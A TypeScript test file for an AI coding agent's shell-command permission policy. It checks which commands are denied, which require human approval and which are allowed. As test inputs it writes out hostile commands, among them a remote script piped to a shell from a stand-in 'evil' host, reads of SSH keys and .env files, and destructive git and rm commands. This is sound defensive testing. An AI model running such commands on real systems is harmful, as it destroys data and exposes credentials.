/**
 * The safety policy (DESIGN §10.1, §13's "table-driven tests of the command parser
 * vs. the spec §11.2/§11.3 lists"). The invariants: SPEC §11.2's list is denied,
 * §11.3's classes ask, the strictest verdict on a line wins, and anything
 * unparsable escalates rather than passing.
 */
import { describe, expect, it } from "vitest";
import type { PermissionRequest, SmartApprover } from "@declarative-ai/permissions";
import { askingParts, entriesToRemember, parseToolset } from "@jaira/shared";
import { shellToolsetOf } from "../src/commandParts";
import { CommandGrants, compilePolicy, decideCommand, isDeniedPath, policyCanEscalate, type JairaPolicy, type PolicyAuditEntry } from "../src/policy";

const OPEN: JairaPolicy = {};
const action = (line: string, policy: JairaPolicy = OPEN): string => decideCommand(policy, line).action;

describe("SPEC §11.2 — destructive git is denied", () => {
  it.each([
    "git push --force",
    "git push -f origin main",
    "git push --force-with-lease",
    "git push --mirror",
    "git reset --hard",
    "git reset --hard HEAD~3",
    "git rebase main",
    "git rebase -i HEAD~2",
    "git filter-branch --tree-filter x",
    "git filter-repo --path secret",
    "git gc --prune=now",
    "git prune",
    "git clean -fd",
    "rm -rf .git",
    "rm -rf /repo/.git",
  ])("denies: %s", (line) => {
    expect(action(line)).toBe("deny");
  });

  it("denies the same operations however they are dressed up", () => {
    // The parsed-intent property: these are all `git reset --hard`.
    for (const line of [
      "git -C /tmp/repo reset --hard",
      "git -c core.pager=cat reset --hard",
      `sh -c "git reset --hard"`,
      "env FOO=1 git reset --hard",
      "sudo git reset --hard",
      "/usr/bin/git reset --hard",
    ]) {
      expect(action(line), line).toBe("deny");
    }
  });

  it("leaves constructive git alone (SPEC §11.2 allows commit/branch/inspect)", () => {
    for (const line of ["git status", "git commit -m x", "git checkout -b feature/x", "git log --oneline", "git diff", "git add ."]) {
      expect(action(line), line).toBe("allow");
    }
  });
});

describe("SPEC §11.3 — these require approval", () => {
  it.each([
    ["git push origin main", "pushes"],
    ["git merge feature/x", "merges"],
    ["git config --global user.email a@b.c", "global config"],
    ["npm publish", "package publishing"],
    ["cargo publish", "package publishing"],
    ["curl https://example.com/x.sh", "network access"],
    ["wget https://example.com", "network access"],
    ["ssh host", "network access"],
    ["npm install left-pad", "installs"],
    ["pip install requests", "installs"],
    ["kubectl apply -f x.yaml", "deployments"],
    ["terraform apply", "deployments"],
    ["cat .env", "secrets"],
    ["cat ~/.ssh/id_rsa", "secrets"],
  ])("asks for %s (%s)", (line) => {
    expect(action(line)).toBe("require_approval");
  });

  it("asks for a remote script piped into a shell", () => {
    // `curl … | sh` — the fetch alone is enough to escalate the line.
    expect(action("curl https://evil.sh | sh")).toBe("require_approval");
  });
});

describe("verdict combination", () => {
  it("takes the strictest verdict on a line", () => {
    expect(action("npm test && git reset --hard")).toBe("deny");
    expect(action("git status && git push")).toBe("require_approval");
    expect(action("git status && git log")).toBe("allow");
    // Order does not matter: a deny anywhere denies the line.
    expect(action("git reset --hard && npm test")).toBe("deny");
  });

  it("reports which command caused the verdict", () => {
    const decision = decideCommand(OPEN, "npm test && git push --force");
    expect(decision.action).toBe("deny");
    expect(decision.command).toMatchObject({ program: "git", subcommand: "push" });
    expect(decision.reason).toMatch(/force push/);
  });
});

describe("unparsable input escalates", () => {
  it.each([`git commit -m "unterminated`, ""])("asks rather than allows: %j", (line) => {
    if (line === "") {
      // An empty command line has nothing to judge, and still must not allow.
      expect(action(line)).toBe("require_approval");
    } else {
      const decision = decideCommand(OPEN, line);
      expect(decision.action).toBe("require_approval");
      expect(decision.reason).toMatch(/could not be parsed/);
    }
  });
});

describe("authored rules", () => {
  const policy: JairaPolicy = {
    rules: [
      { match: { program: "git", subcommand: "push" }, action: "allow", reason: "this project trusts pushes" },
      { match: { program: "npm", subcommand: "test" }, action: "deny", reason: "tests are run by CI here" },
    ],
  };

  it("takes precedence over the built-ins, first match winning", () => {
    // A rule can relax a built-in ask…
    expect(action("git push origin main", policy)).toBe("allow");
    // …and tighten something the built-ins ignore.
    expect(action("npm test", policy)).toBe("deny");
    // Built-ins still apply where no rule matches.
    expect(action("git reset --hard", policy)).toBe("deny");
  });

  it("honours a custom default and lets built-ins be disabled", () => {
    expect(action("some-unknown-tool", { default: "require_approval" })).toBe("require_approval");
    // With built-ins off and an allow default, even destructive git is allowed —
    // the opt-out exists, and it is explicit.
    expect(action("git reset --hard", { builtins: false })).toBe("allow");
  });

  it("matches on flags and argument substrings", () => {
    const flagged: JairaPolicy = {
      rules: [{ match: { program: "docker", anyFlag: ["--privileged"] }, action: "deny" }, { match: { program: "cat", argIncludes: "id_rsa" }, action: "deny" }],
    };
    expect(action("docker run --privileged x", flagged)).toBe("deny");
    expect(action("cat ~/.ssh/id_rsa", flagged)).toBe("deny");
    expect(action("docker ps", flagged)).toBe("require_approval"); // built-in deploy class
  });
});

/**
 * One shell line is several requests (decision 0007 §4): each part is a request for a SUBJECT, checked
 * against the same toolset map as any tool. No categories — a file utility is the standard tool on
 * its path, running a file is `script`, anything else is the program and its subcommand.
 */
describe("a line is judged part by part, against the toolset", () => {
  const TOOLSET = shellToolsetOf(
    parseToolset({
      read_file: "allow",
      glob: "allow",
      grep: "allow",
      write_file: "ask",
      web_fetch: "ask",
      bash: "ask",
      script: "ask",
      "git log": "allow",
      "git commit": "ask",
      "git rm": "deny",
      "git tag --force": "deny",
      "git tag": "allow",
      other: "deny",
    }).toolset,
  )!;

  /** Each part as `«text» subject verdict by source[:entry] ~matched words~`. */
  const judged = (line: string, dialect: "posix" | "powershell" = "posix", policy: JairaPolicy = OPEN, toolset: typeof TOOLSET | undefined = TOOLSET) => {
    const decision = decideCommand(policy, line, dialect, { toolset });
    return {
      action: decision.action,
      parts: decision.parts.parts.map((p) => {
        expect(p.text).toBe(line.slice(p.span.start, p.span.end));
        const by = p.decidedBy.entry !== undefined ? `${p.decidedBy.source}:${p.decidedBy.entry}` : p.decidedBy.source;
        return `«${p.text}» ${p.subject} ${p.verdict} by ${by} ~${p.matched.map((m) => line.slice(m.start, m.end)).join("~")}~`;
      }),
    };
  };

  it.each<[string, string, string[]]>([
    [
      "rm foo.txt && git commit -m wip",
      "require_approval",
      ["«rm foo.txt» write_file asks by toolset:write_file ~rm~", "«git commit -m wip» git commit asks by toolset:git commit ~git commit~"],
    ],
    // `cd` is no request at all; `cat` is `read_file` on its path, `rm` is `write_file`.
    ["cd foo && cat test.txt", "allow", ["«cat test.txt» read_file allowed by toolset:read_file ~cat~"]],
    ["cd foo && rm test.txt", "require_approval", ["«rm test.txt» write_file asks by toolset:write_file ~rm~"]],
    ["cd foo && echo done && pwd && true", "allow", []],
    // Three subcommands of one program, three answers.
    ["git log", "allow", ["«git log» git log allowed by toolset:git log ~git log~"]],
    ["git rm a.txt", "deny", ["«git rm a.txt» git rm denied by toolset:git rm ~git rm~"]],
    ["git commit -m x", "require_approval", ["«git commit -m x» git commit asks by toolset:git commit ~git commit~"]],
    // The words that matched, and not what lies between them.
    ["git -C sub commit --amend", "require_approval", ["«git -C sub commit --amend» git commit asks by toolset:git commit ~git~commit~"]],
    // Refined by a flag: the more specific entry wins.
    ["git tag v1", "allow", ["«git tag v1» git tag allowed by toolset:git tag ~git tag~"]],
    ["git tag v1 --force", "deny", ["«git tag v1 --force» git tag --force denied by toolset:git tag --force ~git tag~--force~"]],
    // No entry for the subcommand or the program: the shell's own entry, and only the program is underlined.
    ["git stash", "require_approval", ["«git stash» git stash asks by toolset:bash ~git~"]],
    ["terraform plan -out tf.plan", "require_approval", ["«terraform plan -out tf.plan» terraform plan asks by toolset:bash ~terraform~"]],
    [
      "find . -name '*.tmp' -exec rm {} \\; | tee cleaned.log > /dev/null",
      "require_approval",
      [
        "«find . -name '*.tmp' -exec rm {} \\;» glob allowed by toolset:glob ~find~",
        "«rm {}» write_file asks by toolset:write_file ~rm~",
        "«tee cleaned.log» write_file asks by toolset:write_file ~tee~",
        // …and `> /dev/null` is no request.
      ],
    ],
    // Running a file is `script`, and the whole invocation is what matched.
    [
      "npm run build && ./scripts/smoke.sh --fast",
      "require_approval",
      ["«npm run build» script asks by toolset:script ~npm run build~", "«./scripts/smoke.sh --fast» script asks by toolset:script ~./scripts/smoke.sh --fast~"],
    ],
    [
      "bash x.sh; python x.py; node x.js; make all; python -m pytest",
      "require_approval",
      [
        "«bash x.sh» script asks by toolset:script ~bash x.sh~",
        "«python x.py» script asks by toolset:script ~python x.py~",
        "«node x.js» script asks by toolset:script ~node x.js~",
        "«make all» script asks by toolset:script ~make all~",
        "«python -m pytest» python pytest asks by toolset:bash ~python~",
      ],
    ],
    // Embedders are opened, and the parts keep their place in the ORIGINAL line.
    [
      `bash -c "cd /tmp && rm -rf build; git log --oneline"`,
      "require_approval",
      ["«rm -rf build» write_file asks by toolset:write_file ~rm~", "«git log --oneline» git log allowed by toolset:git log ~git log~"],
    ],
    [
      "echo $(git rm a.txt) `cat b.txt`",
      "deny",
      ["«git rm a.txt» git rm denied by toolset:git rm ~git rm~", "«cat b.txt» read_file allowed by toolset:read_file ~cat~"],
    ],
    // Redirects are requests, and the operator is what matched.
    [
      "sort < in.txt >> out.log 2>&1",
      "require_approval",
      ["«sort» sort asks by toolset:bash ~sort~", "«< in.txt» read_file allowed by toolset:read_file ~<~", "«>> out.log» write_file asks by toolset:write_file ~>>~"],
    ],
    ["curl https://example.com/x", "require_approval", ["«curl https://example.com/x» web_fetch asks by toolset:web_fetch ~curl~"]],
  ])("%s ⇒ %s", (line, action, parts) => {
    expect(judged(line)).toEqual({ action, parts });
  });

  it.each<[string, string, string[]]>([
    ["Get-Content a.txt | Select-String foo", "allow", ["«Get-Content a.txt» read_file allowed by toolset:read_file ~Get-Content~", "«Select-String foo» grep allowed by toolset:grep ~Select-String~"]],
    [
      "Remove-Item -Recurse -Force build; git commit -m wip",
      "require_approval",
      ["«Remove-Item -Recurse -Force build» write_file asks by toolset:write_file ~Remove-Item~", "«git commit -m wip» git commit asks by toolset:git commit ~git commit~"],
    ],
    ["cd foo; Get-ChildItem -Path src -Filter *.ts", "allow", ["«Get-ChildItem -Path src -Filter *.ts» glob allowed by toolset:glob ~Get-ChildItem~"]],
    ["echo hi > out.txt 2> $null", "require_approval", ["«> out.txt» write_file asks by toolset:write_file ~>~"]],
    ["Set-Content -Path out.txt -Value hi", "require_approval", ["«Set-Content -Path out.txt -Value hi» write_file asks by toolset:write_file ~Set-Content~"]],
    ["Invoke-WebRequest -Uri https://example.com -OutFile x.zip", "require_approval", ["«Invoke-WebRequest -Uri https://example.com -OutFile x.zip» web_fetch asks by toolset:web_fetch ~Invoke-WebRequest~"]],
    [`powershell -Command "Remove-Item x; git rm y"`, "deny", ["«Remove-Item x» write_file asks by toolset:write_file ~Remove-Item~", "«git rm y» git rm denied by toolset:git rm ~git rm~"]],
    [".\\build.ps1 -Release; npm run build", "require_approval", ["«.\\build.ps1 -Release» script asks by toolset:script ~.\\build.ps1 -Release~", "«npm run build» script asks by toolset:script ~npm run build~"]],
    ["terraform plan -out tf.plan", "require_approval", ["«terraform plan -out tf.plan» terraform plan asks by toolset:bash ~terraform~"]],
  ])("PowerShell: %s ⇒ %s", (line, action, parts) => {
    expect(judged(line, "powershell")).toEqual({ action, parts });
  });

  it("carries the path or url of a part, and what remembering it may store", () => {
    const parts = (line: string) => decideCommand(OPEN, line, "posix", { toolset: TOOLSET }).parts.parts;
    expect(parts("cp a.txt dist/b.txt")[0]).toMatchObject({ kind: "tool", subject: "write_file", paths: ["a.txt", "dist/b.txt"], widths: ["cp"] });
    expect(parts("grep -rn TODO src lib")[0]).toMatchObject({ subject: "grep", paths: ["src", "lib"] });
    expect(parts("curl -o x.bin https://example.com/x")[0]).toMatchObject({ subject: "web_fetch", url: "https://example.com/x" });
    expect(parts("git commit -m x")[0]).toMatchObject({ kind: "command", widths: ["git commit", "git"] });
    expect(parts("terraform plan")[0]).toMatchObject({ widths: ["terraform plan", "terraform"] });
    expect(parts("./x.sh")[0]).toMatchObject({ kind: "script", paths: ["./x.sh"], widths: ["script"] });
    expect(parts("echo x > out.txt")[0]).toMatchObject({ kind: "redirect", paths: ["out.txt"], widths: ["write_file"] });
    // A part written inside another says so, which is what lets an approval nest the tints.
    expect(parts("find . -exec rm {} +")[1]).toMatchObject({ text: "rm {}", via: ["find"], within: 0 });
  });

  it("a line the parser cannot model asks, whatever the toolset allows — and a deny beside it stands", () => {
    const open = shellToolsetOf(parseToolset({ bash: "allow", other: "allow" }).toolset)!;
    for (const line of [`git commit -m "unterminated`, "$CMD --hard", "git $(cat x) --hard", `bash -c "echo 'oops"`, "case $x in a) ls;; esac"]) {
      const decision = decideCommand(OPEN, line, "posix", { toolset: open });
      expect(decision.action, line).toBe("require_approval");
      expect(decision.parts.parts.some((p) => p.verdict === "asks" && p.decidedBy.source === "parser"), line).toBe(true);
    }
    expect(decideCommand(OPEN, "git $(cat x)", "powershell", { toolset: open }).action).toBe("require_approval");
    expect(decideCommand(OPEN, `git reset --hard; bash -c "echo 'oops"`, "posix", { toolset: open }).action).toBe("deny");
  });

  it("keeps the destructive floor and `.jaira/` above EVERY toolset, however the command is dressed", () => {
    const open = shellToolsetOf(parseToolset({ bash: "allow", write_file: "allow", read_file: "allow", script: "allow", git: "allow", "git reset": "allow", rm: "allow", other: "allow" }).toolset)!;
    for (const line of [
      "git reset --hard",
      "git push --force",
      "rm -rf .git",
      `sh -c "git reset --hard"`,
      "sudo env X=1 nohup git reset --hard",
      "echo $(git reset --hard)",
      "find . -exec git reset --hard \\;",
      "git submodule foreach 'git reset --hard'",
      "ssh host git reset --hard",
      "if true; then git reset --hard; fi",
      "xargs git clean -fd",
    ]) {
      const decision = decideCommand(OPEN, line, "posix", { toolset: open });
      expect(decision.action, line).toBe("deny");
      expect(decision.parts.parts.find((p) => p.verdict === "denied")?.decidedBy.source, line).toBe("builtin");
    }
    for (const line of ["cat .jaira/settings.json", "echo x > .jaira/tasks/t.json", "cd .jaira", "cp a --target-directory=.jaira/x"]) {
      const decision = decideCommand(OPEN, line, "posix", { toolset: open });
      expect(decision.action, line).toBe("deny");
      expect(decision.parts.parts.find((p) => p.verdict === "denied")?.decidedBy.source, line).toBe("path");
    }
  });

  it("composes with the command policy: rules and the floor first, then the toolset", () => {
    // An entry that NAMES the program replaces a built-in ask — naming it is the decision the built-in stood in for…
    const named = shellToolsetOf(parseToolset({ bash: "allow", "git push": "allow", npm: "allow" }).toolset)!;
    expect(decideCommand(OPEN, "git push origin main", "posix", { toolset: named }).action).toBe("allow");
    expect(decideCommand(OPEN, "npm install left-pad", "posix", { toolset: named }).action).toBe("allow");
    // …and the shell's own `allow` does not: "any other command" is not a statement about pushing.
    const blanket = shellToolsetOf(parseToolset({ bash: "allow" }).toolset)!;
    expect(decideCommand(OPEN, "git push origin main", "posix", { toolset: blanket }).action).toBe("require_approval");
    expect(decideCommand(OPEN, "git status", "posix", { toolset: blanket }).action).toBe("allow");
    // An authored rule is the project's own statement: a toolset may tighten it, never loosen it.
    const rules: JairaPolicy = { rules: [{ match: { program: "git", subcommand: "push" }, action: "deny" }, { match: { program: "tsc" }, action: "allow" }] };
    expect(decideCommand(rules, "git push", "posix", { toolset: named }).action).toBe("deny");
    expect(decideCommand(rules, "tsc --noEmit", "posix", { toolset: shellToolsetOf(parseToolset({ bash: "deny" }).toolset)! }).action).toBe("deny");
    expect(decideCommand(rules, "tsc --noEmit", "posix", { toolset: blanket }).action).toBe("allow");
    // …and no built-in overrides a rule, with a toolset in play or without one.
    const trusting: JairaPolicy = { rules: [{ match: { program: "git", subcommand: "push" }, action: "allow" }] };
    expect(decideCommand(trusting, "git push", "posix", { toolset: blanket }).action).toBe("allow");
    // `smart` on an entry defers to the command policy.
    const deferring = shellToolsetOf(parseToolset({ bash: "smart" }).toolset)!;
    expect(decideCommand(OPEN, "git status", "posix", { toolset: deferring }).action).toBe("allow");
    expect(decideCommand(OPEN, "git push", "posix", { toolset: deferring }).action).toBe("require_approval");
    // A subject the toolset does not hold is not offered: it asks.
    expect(judged("rm x", "posix", OPEN, blanket).parts).toEqual(["«rm x» write_file asks by toolset ~rm~"]);
    // An explicit entry for a utility's PROGRAM beats the standard tool it would otherwise be.
    expect(judged("rm x", "posix", OPEN, shellToolsetOf(parseToolset({ bash: "allow", write_file: "allow", rm: "deny" }).toolset)!).parts).toEqual(["«rm x» write_file denied by toolset:rm ~rm~"]);
  });

  it("with no toolset a line answers to the command policy alone, and still comes apart", () => {
    const decision = decideCommand(OPEN, "rm foo.txt && git push");
    expect(decision.action).toBe("require_approval");
    expect(decision.parts.parts.map((p) => `${p.subject} ${p.verdict} ${p.decidedBy.source}`)).toEqual(["write_file allowed default", "git push asks builtin"]);
    expect(decision.parts.parts[1]!.matched.map((m) => "rm foo.txt && git push".slice(m.start, m.end))).toEqual(["git push"]);
  });

  it("remembers an answer for the asking PARTS at a chosen width — never the line", () => {
    const grants = new CommandGrants();
    const line = "rm foo.txt && git commit -m wip && git log";
    const first = decideCommand(OPEN, line, "posix", { toolset: TOOLSET, grants });
    expect(askingParts(first.parts).map((p) => p.subject)).toEqual(["write_file", "git commit"]);
    expect(entriesToRemember(first.parts, "allow")).toEqual({ rm: "allow", "git commit": "allow" });
    // `git` rather than `git commit`; `rm` has one width. The allowed `git log` part is not remembered.
    expect(grants.rememberParts(first.parts, "allow", ["git"])).toEqual(["rm", "git"]);
    expect(grants.list()).toEqual({ rm: "allow", git: "allow" });

    // A DIFFERENT line holding the same requests no longer asks…
    const second = decideCommand(OPEN, "git commit --amend; rm other.txt", "posix", { toolset: TOOLSET, grants });
    expect(second.action).toBe("allow");
    expect(second.parts.parts.map((p) => `${p.decidedBy.source}:${p.decidedBy.entry}`)).toEqual(["remembered:git", "remembered:rm"]);
    // …a part that still asks still asks…
    expect(decideCommand(OPEN, "git commit -m x && terraform apply", "posix", { toolset: TOOLSET, grants }).action).toBe("require_approval");
    // …and a remembered width never lifts a deny: the toolset's, or the floor's.
    expect(decideCommand(OPEN, "git rm a.txt", "posix", { toolset: TOOLSET, grants }).action).toBe("deny");
    expect(decideCommand(OPEN, "git reset --hard", "posix", { toolset: TOOLSET, grants }).action).toBe("deny");
    // A width no asking part offers is not stored — so the line itself never can be.
    expect(new CommandGrants().rememberParts(first.parts, "allow", [line, "git log"])).toEqual(["rm", "git commit"]);
  });
});

describe("isDeniedPath", () => {
  it("denies .jaira wherever it appears", () => {
    // §1g item 5: a worktree normally contains .jaira/, so this is the enforcement.
    for (const p of [".jaira/settings.json", "C:\\repo\\.jaira\\jaira.db", "/repo/.jaira", "sub/.jaira/tasks/x.json"]) {
      expect(isDeniedPath(p), p).toBe(true);
    }
    for (const p of ["src/index.ts", "artifacts/x.md", "notjaira/x", ".jairaish/x"]) {
      expect(isDeniedPath(p), p).toBe(false);
    }
  });
});

// --- the compiled ExecPolicy -------------------------------------------------

const request = (input: Record<string, unknown>): PermissionRequest =>
  ({ tool: "bash", input: input as never, sessionId: "s1" });

/** Invoke a compiled policy's smart approver for a tool. */
async function verdict(policy: JairaPolicy, tool: string, input: Record<string, unknown>, audit?: PolicyAuditEntry[]) {
  const compiled = compilePolicy(policy, audit ? { onDecision: (e) => audit.push(e) } : {});
  const smart = compiled.smart?.[tool] as SmartApprover | undefined;
  expect(smart, `no smart approver for ${tool}`).toBeDefined();
  return smart!(request(input));
}

describe("compilePolicy", () => {
  it("puts command tools in smart mode and keeps authored tool modes", () => {
    const compiled = compilePolicy({ tools: { write_file: "ask" }, toolDefault: "allow", profile: "read-only" });
    expect(compiled.baseline?.tools?.["bash"]).toBe("smart");
    expect(compiled.baseline?.tools?.["write_file"]).toBe("ask");
    expect(compiled.baseline?.default).toBe("allow");
    expect(compiled.baseline?.profile).toBe("read-only");
    expect(Object.keys(compiled.smart ?? {})).toContain("bash");
  });

  it("maps policy actions onto smart verdicts", async () => {
    expect(await verdict(OPEN, "bash", { command: "git status" })).toBe("allow");
    expect(await verdict(OPEN, "bash", { command: "git reset --hard" })).toBe("deny");
    // require_approval escalates to the human gate.
    expect(await verdict(OPEN, "bash", { command: "git push" })).toBe("ask");
  });

  it("denies .jaira/ by path, for command and file tools alike", async () => {
    expect(await verdict(OPEN, "bash", { command: "cat .jaira/settings.json" })).toBe("deny");
    expect(await verdict({ tools: { write_file: "smart" } }, "write_file", { path: ".jaira/tasks/x.json" })).toBe("deny");
    expect(await verdict({ tools: { write_file: "smart" } }, "write_file", { path: "src/x.ts" })).toBe("ask");
  });

  it("escalates when a command tool has no command to read", async () => {
    expect(await verdict(OPEN, "bash", { unexpected: 1 })).toBe("ask");
  });

  describe("a produced artifact is judged by its size", () => {
    /** Compile with a threshold and ask about one call. */
    async function sized(tool: string, input: Record<string, unknown>, askAboveBytes: number, audit?: PolicyAuditEntry[]) {
      const compiled = compilePolicy(OPEN, {
        askAboveBytes,
        ...(audit ? { onDecision: (e: PolicyAuditEntry) => audit.push(e) } : {}),
      });
      const smart = compiled.smart?.[tool] as SmartApprover | undefined;
      expect(smart, `no smart approver for ${tool}`).toBeDefined();
      return smart!({ tool, input: input as never, sessionId: "s1" });
    }

    it("has the RULE without taking the tool's permission away", () => {
      // The rule is registered and the baseline is silent, which is the whole distinction. A baseline
      // `smart` resolves through the approver INSTEAD of through the tool's mode — so `show_artifact`
      // was waved through under the ceiling while `write_file` beside it asked, and the permission
      // menu showed a mode that governed nothing. It now falls to its mode like every other tool, and
      // the size rule waits for somebody to author `smart`.
      const compiled = compilePolicy(OPEN);
      expect(compiled.baseline?.tools?.["show_artifact"]).toBeUndefined();
      expect(Object.keys(compiled.smart ?? {})).toContain("show_artifact");
    });

    it("leaves every OTHER producing tool's default exactly where it was", () => {
      const compiled = compilePolicy(OPEN);
      expect(compiled.baseline?.tools?.["write_file"]).toBeUndefined();
      expect(compiled.baseline?.tools?.["edit"]).toBeUndefined();
      expect(Object.keys(compiled.smart ?? {})).not.toContain("write_file");
    });

    it("passes what is ordinary and asks about what is enormous", async () => {
      expect(await sized("show_artifact", { path: "a.html", content: "<p>hi</p>" }, 1024)).toBe("allow");
      expect(await sized("show_artifact", { path: "a.html", content: "x".repeat(2048) }, 1024)).toBe("ask");
      // Measured in BYTES, not characters — one emoji is four of them.
      expect(await sized("show_artifact", { path: "a.html", content: "🙂".repeat(3) }, 8)).toBe("ask");
    });

    it("says how big it is, so the question can be answered", async () => {
      const audit: PolicyAuditEntry[] = [];
      await sized("show_artifact", { path: "a.html", content: "x".repeat(2_097_152) }, 1_048_576, audit);
      expect(audit[0]).toMatchObject({ tool: "show_artifact", action: "require_approval" });
      expect(audit[0]!.reason).toMatch(/2\.0 MB/);
    });

    it("has no ceiling — 0 turns the question off entirely", async () => {
      // The user's rule: unlimited size, but ask above a point. Setting no point means never asking.
      expect(await sized("show_artifact", { path: "a.html", content: "x".repeat(50_000_000) }, 0)).toBe("allow");
    });

    it("still refuses .jaira/ whatever the size", async () => {
      expect(await sized("show_artifact", { path: ".jaira/x.html", content: "tiny" }, 1024)).toBe("deny");
    });

    it("gives an opted-in write_file a real answer instead of a blanket escalation", async () => {
      // Authoring `smart` on a non-command tool used to mean "always ask", because there was no
      // command to read and nothing else was judged. Now the payload is.
      const compiled = compilePolicy({ tools: { write_file: "smart" } }, { askAboveBytes: 1024 });
      const smart = compiled.smart?.["write_file"] as SmartApprover | undefined;
      expect(await smart!({ tool: "write_file", input: { path: "a.ts", content: "small" } as never, sessionId: "s1" })).toBe("allow");
      expect(
        await smart!({ tool: "write_file", input: { path: "a.ts", content: "x".repeat(2048) } as never, sessionId: "s1" }),
      ).toBe("ask");
      // And a call with nothing to judge is still escalated rather than assumed.
      expect(await smart!({ tool: "write_file", input: { path: "a.ts" } as never, sessionId: "s1" })).toBe("ask");
    });
  });

  it("records every decision for the audit trail (§10.2)", async () => {
    const audit: PolicyAuditEntry[] = [];
    await verdict(OPEN, "bash", { command: "git push --force" }, audit);
    expect(audit).toHaveLength(1);
    expect(audit[0]).toMatchObject({ tool: "bash", command: "git push --force", action: "deny", sessionId: "s1" });
    expect(audit[0]!.parsed).toMatchObject({ program: "git", subcommand: "push" });
    expect(audit[0]!.reason).toMatch(/force push/);
  });

  it("parses PowerShell for a native project and POSIX for a WSL one", () => {
    // The dialect follows the project's execEnvironment: PowerShell expression
    // syntax is unmodellable, so it escalates on Windows…
    const windows = compilePolicy(OPEN, { execEnv: "windows" });
    const wsl = compilePolicy(OPEN, { execEnv: { wsl: "Ubuntu" } });
    expect(windows.smart?.["bash"]).toBeDefined();
    expect(wsl.smart?.["bash"]).toBeDefined();
    // …which is observable through decideCommand's dialect handling.
    expect(decideCommand(OPEN, "git $(cat x)", "powershell").action).toBe("require_approval");
    expect(decideCommand(OPEN, "git status", "posix").action).toBe("allow");
  });
});

describe("policyCanEscalate", () => {
  it("is true whenever a human could be asked — which is what §8.2 gates on", () => {
    // The built-ins carry SPEC §11.3's approval classes, so they can always ask.
    expect(policyCanEscalate({})).toBe(true);
    expect(policyCanEscalate({ builtins: false })).toBe(false);
    expect(policyCanEscalate({ builtins: false, default: "require_approval" })).toBe(true);
    expect(
      policyCanEscalate({ builtins: false, rules: [{ match: { program: "git" }, action: "require_approval" }] }),
    ).toBe(true);
    expect(policyCanEscalate({ builtins: false, rules: [{ match: { program: "git" }, action: "deny" }] })).toBe(false);
  });
});
